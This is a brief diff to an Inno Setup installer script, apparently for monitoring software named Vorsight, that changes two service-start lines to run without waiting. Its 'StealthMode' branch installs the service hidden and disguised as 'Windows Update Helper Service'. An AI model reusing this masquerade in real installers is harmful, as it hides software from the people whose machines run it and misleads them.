@@ -167,10 +167,10 @@ end;
 ; Install and start the Windows Service
 #if StealthMode == 1
   Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install --service-name WindowsUpdateService --display-name ""Windows Update Helper Service"" --description ""Provides background update checking and system health monitoring"""; StatusMsg: "Installing Windows service..."; Flags: runhidden waituntilterminated
-  Filename: "sc"; Parameters: "start WindowsUpdateService"; StatusMsg: "Starting service..."; Flags: runhidden waituntilterminated
+  Filename: "sc"; Parameters: "start WindowsUpdateService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
 #else
   Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install"; StatusMsg: "Installing Windows service..."; Flags: runhidden waituntilterminated
-  Filename: "sc"; Parameters: "start VorsightService"; StatusMsg: "Starting service..."; Flags: runhidden waituntilterminated
+  Filename: "sc"; Parameters: "start VorsightService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
 #endif
 
 [UninstallRun]
